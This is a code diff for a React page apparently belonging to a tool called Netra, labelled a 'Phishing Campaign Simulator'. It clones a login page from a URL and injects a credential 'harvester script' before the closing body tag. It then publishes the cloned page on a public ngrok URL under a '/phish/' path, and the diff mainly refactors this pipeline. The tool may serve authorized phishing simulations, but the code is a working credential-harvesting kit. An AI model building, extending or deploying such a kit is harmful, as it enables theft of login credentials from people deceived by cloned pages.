@@ -1,3 +1,4 @@
+
 'use client';
 
 import { useState, useEffect, useRef } from 'react';
@@ -17,7 +18,7 @@ import { z } from 'zod';
 import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { Textarea } from '@/components/ui/textarea';
-import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
+import { clonePageFromUrl } from 'workspace/src/ai/flows/clone-page-from-url-flow';
 import { startNgrokTunnel, getNgrokTunnelUrl } from '@/services/ngrok-service';
 
 const clonerSchema = z.object({
@@ -29,10 +30,11 @@ const clonerSchema = z.object({
   path: ['urlToClone'],
 });
 
-export default function PhishingPage() {
+const storageKey = 'netra-captured-credentials';
+
+export default function ActiveCampaigns() {
   const { toast } = useToast();
   const [capturedCredentials, setCapturedCredentials] = useState<CapturedCredential[]>([]);
-  const storageKey = 'netra-captured-credentials';
   const { user } = useAuth();
 
   const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
@@ -134,15 +136,15 @@ export default function PhishingPage() {
               source: window.location.href,
               timestamp: new Date().toISOString()
             };
-            const storageKey = 'netra-captured-credentials';
+            
             try {
-              const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
+              const existingData = JSON.parse(localStorage.getItem('${storageKey}') || '[]');
               const updatedData = [...existingData, entry];
-              localStorage.setItem(storageKey, JSON.stringify(updatedData));
+              localStorage.setItem('${storageKey}', JSON.stringify(updatedData));
 
               // This event notifies our main app window that new credentials were captured.
               window.dispatchEvent(new StorageEvent('storage', {
-                key: storageKey,
+                key: '${storageKey}',
                 newValue: JSON.stringify(updatedData)
               }));
             } catch(e) {
@@ -201,15 +203,15 @@ export default function PhishingPage() {
       // Inject <base> tag to fix relative links
       if (baseHrefUrl) {
         if (html.includes('<head>')) {
-          html = html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`);
+          html = html.replace(/<head>/i, '<head>\\n<base href="' + baseHrefUrl + '">');
         } else {
-          html = `<head><base href="${baseHrefUrl}"></head>${html}`;
+          html = '<head><base href="' + baseHrefUrl + '"></head>' + html;
         }
       }
 
       // Inject harvester script
       if (html.includes('</body>')) {
-          html = html.replace(/<\\/body>/i, `${harvesterScript}</body>`);
+          html = html.replace(/<\/body>/i, harvesterScript + '</body>');
       } else {
           html += harvesterScript;
       }
@@ -229,23 +231,24 @@ export default function PhishingPage() {
     if (!modifiedHtml) return;
     setIsHosting(true);
     setHostedUrl(null);
-    toast({ title: "Generating Public Link...", description: "Starting ngrok tunnel. This may take a moment." });
+    
 
     try {
+      toast({ title: "Generating Public Link...", description: "Starting ngrok tunnel. This may take a moment." });
       // Start the tunnel but don't wait for it
-      await startNgrokTunnel();
+      const { id } = await startNgrokTunnel();
 
       const pageId = crypto.randomUUID();
-      const storageKey = `phishing-html-${pageId}`;
+      const storageKey = 'phishing-html-' + pageId;
       localStorage.setItem(storageKey, modifiedHtml);
       
       // Poll for the URL
       pollIntervalRef.current = setInterval(async () => {
         try {
-          const { status, url } = await getNgrokTunnelUrl();
+          const { status, url } = await getNgrokTunnelUrl({ id });
           if (status === 'connected' && url) {
             if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
-            const finalUrl = `${url}/phish/${pageId}`;
+            const finalUrl = url + '/phish/' + pageId;
             setHostedUrl(finalUrl);
             setIsHosting(false);
             toast({ title: "Public Link Generated!", description: "Your phishing page is accessible via ngrok." });
@@ -253,7 +256,7 @@ export default function PhishingPage() {
             logActivity({
                 user: user?.displayName || 'Operator',
                 action: 'Generated Phishing Link',
-                details: `Source: ${urlToClone || 'Pasted HTML'}`,
+                details: 'Source: ' + (urlToClone || 'Pasted HTML'),
             });
           } else if (status === 'error') {
             if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
@@ -290,12 +293,12 @@ export default function PhishingPage() {
 
 
   return (
-    <div className="flex flex-col gap-6">
-      <div>
-        <h1 className="font-headline text-3xl font-semibold">Phishing Campaign Simulator</h1>
-        <p className="text-muted-foreground">Clone login pages and manage credential harvesting campaigns.</p>
-      </div>
-      
+    <Card>
+      <CardHeader>
+        <CardTitle>Phishing Campaign Simulator</CardTitle>
+        <CardDescription>Clone login pages and manage credential harvesting campaigns.</CardDescription>
+      </CardHeader>
+      <CardContent>
       <div className="grid lg:grid-cols-2 gap-6 items-start">
         <div className="flex flex-col gap-6">
             <Card>
@@ -411,6 +414,7 @@ export default function PhishingPage() {
           />
         </div>
       </div>
-    </div>
+      </CardContent>
+    </Card>
   );
 }
